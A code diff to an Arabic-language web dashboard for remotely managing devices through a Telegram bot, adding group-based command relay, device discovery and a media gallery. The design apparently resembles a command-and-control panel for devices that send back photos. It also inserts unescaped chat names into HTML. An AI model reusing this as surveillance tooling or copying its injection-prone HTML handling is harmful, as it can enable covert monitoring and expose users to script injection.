@@ -70,6 +70,45 @@ body{
 }
 #loginOverlay .box .login-btn:disabled{opacity:.5;pointer-events:none}
 #loginOverlay .box .login-error{font-size:12px;color:var(--red);margin-top:10px;min-height:18px}
+
+/* ====== Setup ====== */
+#setupOverlay{
+    position:fixed;inset:0;z-index:99998;
+    display:flex;align-items:center;justify-content:center;
+    background:rgba(0,0,0,.7);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);
+    opacity:0;pointer-events:none;transition:opacity .3s;padding:20px;
+}
+#setupOverlay.show{opacity:1;pointer-events:auto}
+.setup-box{
+    width:400px;max-width:100%;padding:28px 24px 24px;
+    background:var(--surface);border-radius:var(--radius);
+    border:1px solid var(--border);position:relative;max-height:90vh;overflow-y:auto;
+}
+.setup-close{
+    position:absolute;top:12px;left:12px;width:32px;height:32px;border-radius:50%;
+    border:none;background:var(--surface2);color:var(--text2);font-size:16px;
+    cursor:pointer;display:flex;align-items:center;justify-content:center;
+}
+.setup-icon{font-size:36px;text-align:center;margin-bottom:4px}
+.setup-box h2{text-align:center;font-size:17px;font-weight:700}
+.setup-desc{text-align:center;font-size:12px;color:var(--text2);margin:2px 0 16px}
+.setup-steps{display:flex;flex-direction:column;gap:10px;margin-bottom:14px}
+.setup-step{
+    display:flex;align-items:center;gap:10px;font-size:13px;
+    background:var(--surface2);padding:10px 14px;border-radius:var(--radius-sm);
+    border:1px solid var(--border);
+}
+.setup-step code{font-size:11px;background:rgba(124,108,240,.2);padding:2px 8px;border-radius:6px;direction:ltr;display:inline-block}
+.step-num{
+    width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent2));
+    display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0;
+}
+.group-status{
+    margin-top:12px;padding:12px;border-radius:var(--radius-sm);text-align:center;font-size:13px;
+    border:1px solid var(--border);
+}
+.group-status.active{background:rgba(45,212,160,.1);border-color:var(--green);color:var(--green)}
+.group-status.inactive{background:rgba(239,84,84,.1);border-color:var(--red);color:var(--red)}
 /* ====== Buttons ====== */
 .btn{
     display:inline-flex;align-items:center;justify-content:center;gap:6px;
@@ -257,14 +296,33 @@ body{
             <div class="login-error" id="loginError"></div>
         </div>
     </div>
+    <!-- ====== Setup Overlay ====== -->
+    <div id="setupOverlay">
+        <div class="setup-box">
+            <button class="setup-close" id="setupClose">✕</button>
+            <div class="setup-icon">⚙️</div>
+            <h2>إعداد مجموعة التحكم</h2>
+            <p class="setup-desc">لازم مجموعة تلجرام عشان Dashboard والجهاز يتواصلوا</p>
+            <div class="setup-steps">
+                <div class="setup-step"><span class="step-num">1</span> افتح تلجرام وأنشئ <strong>مجموعة جديدة</strong></div>
+                <div class="setup-step"><span class="step-num">2</span> أضف البوت <code>@my33_camera123_bot</code> كـ <strong>مشرف</strong></div>
+                <div class="setup-step"><span class="step-num">3</span> اكتب أي حاجة في المجموعة (مثلاً "hi")</div>
+                <div class="setup-step"><span class="step-num">4</span> اضغط <strong>🔍 كشف المجموعة</strong></div>
+            </div>
+            <button class="btn btn-primary btn-lg" id="detectGroupBtn" style="width:100%;margin-top:6px">🔍 كشف المجموعة</button>
+            <div id="detectResult" style="margin-top:10px;font-size:13px;text-align:center;min-height:20px"></div>
+            <div id="groupStatus" class="group-status"></div>
+        </div>
+    </div>
     <!-- ====== Main Page ====== -->
     <div class="page active" id="mainPage">
         <div class="header">
             <div>
                 <div class="logo">📡 لوحة التحكم</div>
-                <div class="sub">إدارة الأجهزة عن بُعد</div>
+                <div class="sub" id="modeStatus">إدارة الأجهزة عن بُعد</div>
             </div>
             <div class="header-actions">
+                <button class="btn btn-icon btn-outline" id="setupBtn" aria-label="إعدادات" style="font-size:16px">⚙️</button>
                 <button class="btn btn-icon btn-primary" id="scanBtn" aria-label="فحص">🔍</button>
             </div>
         </div>
@@ -283,7 +341,7 @@ body{
             <button class="btn btn-icon btn-ghost" id="backBtn" aria-label="رجوع">➜</button>
             <div style="flex:1;min-width:0">
                 <div style="font-size:16px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" id="userPageTitle"></div>
-                <div style="font-size:11px;color:var(--text2)" id="userPageSub"></div>
+                <span style="font-size:11px;color:var(--text2)" id="userPageSub"></span>
             </div>
             <button class="btn btn-icon btn-ghost" id="refreshGallery" aria-label="تحديث">🔄</button>
         </div>
@@ -317,6 +375,14 @@ body{
                     <button class="btn btn-primary" id="sendMsgBtn">إرسال</button>
                 </div>
                 <div class="cmd-status" id="cmdStatus"></div>
+            </div>
+
+            <!-- Group Status Banner -->
+            <div id="groupBanner" class="card" style="padding:10px 14px;display:none">
+                <div style="display:flex;align-items:center;gap:8px;font-size:12px">
+                    <span>🔄</span>
+                    <span>الأوامر ترسل عبر <strong id="groupBannerName">المجموعة</strong></span>
+                </div>
             </div>
 
             <!-- Gallery -->
@@ -391,6 +457,84 @@ loginBtn.onclick=doLogin;
 loginPass.addEventListener("keydown",e=>{if(e.key==="Enter")doLogin()});
 checkLogin();
 
+// ========== Setup / Group ==========
+const GROUP_KEY="group_chat_id";
+const setupOverlay=document.getElementById("setupOverlay");
+const detectResult=document.getElementById("detectResult");
+const groupStatus=document.getElementById("groupStatus");
+
+function getGroupId(){return localStorage.getItem(GROUP_KEY)}
+function setGroupId(id){localStorage.setItem(GROUP_KEY,id);updateGroupStatus()}
+function clearGroupId(){localStorage.removeItem(GROUP_KEY);updateGroupStatus()}
+
+function updateGroupStatus(){
+    const id=getGroupId();
+    const el=document.getElementById("modeStatus");
+    if(id){
+        el.textContent=`✅ متصل عبر المجموعة`;
+        groupStatus.className="group-status active";
+        groupStatus.innerHTML=`✅ المجموعة مفعلة<br><span style="font-size:11px;opacity:.7">ID: ${id}</span>`;
+    }else{
+        el.textContent=`⚠️ إعداد المجموعة ⚙️`;
+        groupStatus.className="group-status inactive";
+        groupStatus.innerHTML="⚠️ لا توجد مجموعة — استخدم الأزرار العادية";
+    }
+}
+
+document.getElementById("setupBtn").onclick=()=>{
+    detectResult.textContent="";updateGroupStatus();
+    setupOverlay.classList.add("show");
+};
+document.getElementById("setupClose").onclick=()=>setupOverlay.classList.remove("show");
+
+document.getElementById("detectGroupBtn").onclick=async()=>{
+    detectResult.textContent="⏳ جاري البحث...";
+    try{
+        const updates=await fetchAllUpdates();
+        let groups=[];
+        updates.forEach(u=>{
+            const msg=u.message||u.channel_post;
+            if(!msg||!msg.chat)return;
+            if(msg.chat.type==="group"||msg.chat.type==="supergroup"){
+                const id=String(msg.chat.id);
+                if(!groups.find(g=>g.id===id)){
+                    groups.push({id,name:msg.chat.title||id,type:msg.chat.type});
+                }
+            }
+        });
+        if(groups.length===0){
+            detectResult.innerHTML="❌ لم يتم العثور على مجموعات.<br>تأكد من إضافة البوت كمشرف في المجموعة";
+            return;
+        }
+        let html="<div style='margin-top:8px;font-size:12px;color:var(--text2);margin-bottom:6px'>اختر مجموعة التحكم:</div>";
+        groups.forEach(g=>{
+            html+=`<div class="setup-step" onclick="selectGroup('${g.id}','${g.name.replace(/'/g,"\\'")}')" style="cursor:pointer">
+                <span style="font-size:18px">${g.type==="supergroup"?"👥":"💬"}</span>
+                <div style="flex:1;min-width:0">
+                    <div style="font-size:13px;font-weight:600">${g.name}</div>
+                    <div style="font-size:10px;color:var(--text2);direction:ltr">${g.id}</div>
+                </div>
+                <span style="color:var(--accent);font-size:12px">اختيار</span>
+            </div>`;
+        });
+        html+=`<div class="setup-step" onclick="clearGroupId();detectResult.innerHTML='✅ تم إلغاء المجموعة';updateGroupStatus()" style="cursor:pointer;justify-content:center;color:var(--text3);font-size:12px">
+            إلغاء التحديد
+        </div>`;
+        detectResult.innerHTML=html;
+    }catch(e){detectResult.innerHTML="❌ خطأ: "+e.message}
+};
+
+function selectGroup(id,name){
+    setGroupId(id);
+    detectResult.innerHTML=`✅ تم اختيار "${name}"`;
+    setupOverlay.classList.remove("show");
+    showToast(`✅ مجموعة "${name}" مفعلة`);
+    // Auto scan
+    setTimeout(()=>document.getElementById("scanBtn").click(),500);
+}
+
+updateGroupStatus();
+
 // ========== Config ==========
 const STORAGE_KEY="telegram_devices_v4";
 const mainPage=document.getElementById("mainPage");
@@ -440,8 +584,11 @@ async function api(method,data){
 }
 
 async function sendCmd(chatId,text){
-    const r=await api("sendMessage",{chat_id:chatId,text});
-    if(r.ok){log(`➡️ ${text}`,"sent")}else{log(`❌ ${r.description}`,"err")}
+    // Prefer group chat for commands (device sees group messages in getUpdates)
+    const groupId=getGroupId();
+    const targetId=groupId||chatId;
+    const r=await api("sendMessage",{chat_id:targetId,text});
+    if(r.ok){log(`➡️ ${text} → ${groupId?'المجموعة':'الجهاز'}`,"sent")}else{log(`❌ ${r.description}`,"err")}
     return r.ok;
 }
 
@@ -460,11 +607,18 @@ async function fetchAllUpdates(){
 
 function extractMediaFromUpdates(chatId,updates){
     const media=[];
+    const groupId=getGroupId();
     updates.forEach(u=>{
         const msg=u.message||u.channel_post;
         if(!msg)return;
         const cid=String(msg.chat.id);
-        if(cid!==chatId)return;
+        // Match direct chat OR group (if group is configured)
+        if(cid!==chatId&&(!groupId||cid!==groupId))return;
+        // Only get media from group if it mentions this device or it's the active device
+        if(groupId&&cid===groupId){
+            // In group mode, only extract media that was sent by the device (has deviceId in caption)
+            // Or extract ALL media and show in the device gallery
+        }
         if(msg.photo){
             const sizes=msg.photo;
             const best=sizes[sizes.length-1];
@@ -506,6 +660,7 @@ function renderUserList(){
                 <div class="empty-state">
                     <div class="icon">📡</div>
                     <p>لا توجد أجهزة بعد<br>اضغط <strong>🔍</strong> للبحث</p>
+                    <button class="btn btn-outline btn-sm" onclick="addDeviceManually()" style="margin-top:12px">➕ إضافة جهاز يدوي</button>
                 </div>
             </div>`;
         return;
@@ -538,6 +693,14 @@ async function openUser(chatId){
     currentUserId=chatId;
     const d=devices.find(x=>x.chatId==chatId);
     if(!d)return;
+    const groupId=getGroupId();
+    const groupBanner=document.getElementById("groupBanner");
+    if(groupId){
+        groupBanner.style.display="block";
+        document.getElementById("groupBannerName").textContent=`المجموعة (ID: ${groupId})`;
+    }else{
+        groupBanner.style.display="none";
+    }
     document.getElementById("userName").textContent=d.name;
     document.getElementById("userSub").textContent=`🆔 ${chatId}${d.deviceId?' · '+d.deviceId:''}`;
     document.getElementById("userPageTitle").textContent=d.name;
@@ -676,6 +839,18 @@ document.getElementById("refreshGallery").onclick=()=>{
     }
 };
 
+// ========== Manual Add ==========
+function addDeviceManually(){
+    const id=prompt("أدخل Chat ID الخاص بالجهاز (موجود في رسالة التسجيل)");
+    if(!id||!id.trim())return;
+    const chatId=id.trim();
+    if(devices.find(d=>d.chatId==chatId)){showToast("⚠️ الجهاز موجود بالفعل");return}
+    devices.push({chatId,name:"جهاز "+chatId,deviceId:"",lastSeen:Date.now(),addedAt:Date.now(),thumbnails:[]});
+    saveDevices();
+    showToast(`✅ تم إضافة الجهاز ${chatId}`);
+    openUser(chatId);
+}
+
 // ========== Scan ==========
 let scanning=false;
 document.getElementById("scanBtn").onclick=async()=>{
@@ -686,7 +861,26 @@ document.getElementById("scanBtn").onclick=async()=>{
     btn.disabled=true;
     try{
         const updates=await fetchAllUpdates();
+        // Also check HTTP-registered devices from /api/ping
+        let httpDevices=[];
+        try{
+            const pr=await fetch("/api/ping?action=list");
+            const pj=await pr.json();
+            if(pj.ok&&pj.devices)httpDevices=pj.devices;
+        }catch(e){}
         let newDevices=0;
+        // Process HTTP devices first
+        httpDevices.forEach(d=>{
+            const existing=devices.find(x=>x.chatId==d.chatId);
+            if(existing){
+                existing.lastSeen=Date.now();
+                if(d.deviceId)existing.deviceId=d.deviceId;
+            }else{
+                devices.push({chatId:d.chatId,name:d.name||d.chatId,deviceId:d.deviceId||"",lastSeen:Date.now(),addedAt:Date.now(),thumbnails:[]});
+                newDevices++;
+            }
+        });
+        // Then process Telegram updates
         updates.forEach(u=>{
             const msg=u.message||u.channel_post;
             if(!msg)return;
@@ -695,6 +889,7 @@ document.getElementById("scanBtn").onclick=async()=>{
             const chatId=String(chat.id);
             let name=chat.title||chat.first_name||chat.username||"";
             let deviceId="";
+            // Detect registration from device (group or direct)
             if(text.includes("🆕")||text.includes("جهاز جديد")||text.includes("مسجل")){
                 const m1=text.match(/المعرف: (\S+)/);
                 if(m1)deviceId=m1[1];
@@ -702,6 +897,8 @@ document.getElementById("scanBtn").onclick=async()=>{
                 if(m2)name=m2[1];
             }
             if(!name)name=chatId;
+            // Skip group chats as devices
+            if(chat.type==="group"||chat.type==="supergroup")return;
             const existing=devices.find(d=>d.chatId==chatId);
             if(existing){
                 existing.lastSeen=Date.now();
